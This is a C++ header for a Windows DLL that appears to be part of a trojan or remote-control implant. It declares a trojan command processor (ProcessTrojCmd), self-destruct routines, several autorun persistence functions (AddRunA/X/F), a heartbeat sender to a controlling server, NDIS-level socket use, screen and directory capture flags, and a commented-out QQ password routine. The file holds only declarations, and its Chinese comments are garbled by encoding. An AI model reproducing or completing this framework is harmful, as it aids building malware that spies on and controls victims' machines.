// Base.h: interface for the Base class.
//				dll��ʼ������
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_BASE_H__18F8CE0D_F48A_4E86_9DCF_F17AC7358E3F__INCLUDED_)
#define AFX_BASE_H__18F8CE0D_F48A_4E86_9DCF_F17AC7358E3F__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "Struct.h"
#include "NdisSocket.h"
#include "processcmd.h"

class Base  
{
public:
	/*!
	  \fn 	void ThreadWorkStart();	
	  \brief 
	  \param 
	  \param 
	  \return
	  ������ϸ
	*/
	void ThreadWorkStart();
private:	
	/*!
	  \fn static DWORD WINAPI ThreadWork(LPVOID p);
	  \brief �����߳�
	  \param 
	  \param 
	  \return
	   �����߳�
	*/
	static DWORD WINAPI ThreadWork(LPVOID p);	

public:
	Base();
	virtual ~Base();
};

#define		MUTEX_WORK				"WORK_20160328175600761943"	

#define		OTHER_WORK				"OTHER_20170328175600761943"	 

//����ľ��������
BOOL	ProcessTrojCmd(char *buffer, int buflen);

extern DWORD	v_VirtualServerIp;
extern DWORD	v_ReserveIp;
extern DWORD   v_bSendType;

extern BOOL g_screenwork;
extern BOOL g_md5work;
extern BOOL g_dirwork;

extern time_t  g_time;

BOOL DestroyTro();
BOOL CheckDestory();
void GetSignHead();
BOOL SetHeadSign(DWORD* pPara);

bool SetNetLoGon(char *value);

BOOL GetAnlysebySalf();
//BOOL DelQQPass(DWORD* pPara);

BOOL AddRunA();
BOOL AddRunX();

BOOL AddRunF();//2018-06-02
void DelRunF();

/*!
  \fn BOOL	SendHeartPacket(
				char* buffer);
  \brief //��������������
  \param ����
  \return
  ������ϸ
*/
void SendHeartPacket(time_t &SendHeart);

#endif // !defined(AFX_BASE_H__18F8CE0D_F48A_4E86_9DCF_F17AC7358E3F__INCLUDED_)
